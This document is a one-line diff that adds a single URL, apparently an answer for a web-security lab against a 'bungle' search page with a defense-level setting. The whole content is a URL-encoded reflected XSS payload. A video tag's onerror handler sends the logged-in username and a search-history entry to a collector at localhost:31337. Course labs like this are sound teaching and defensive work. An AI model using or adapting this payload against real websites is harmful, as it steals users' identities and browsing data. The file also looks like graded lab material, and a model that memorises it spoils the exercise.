@@ -1,0 +1,1 @@
+https://bungle.sysnet.ucsd.edu/search?xssdefense=3&q=%3Cvideo%20src%3Dx%20onerror%3Dnew(Image)().src%3D%60http%3A%2F%2Flocalhost%3A31337%2F%3Fstolen_user%3D%60%2Bdocument.getElementById(%60logged-in-user%60).textContent.trim()%2B%60%26last_search%3D%60%2Bdocument.querySelectorAll(%60a.history-item%60).item(1).textContent.trim()%3E%3C%2Fvideo%3E
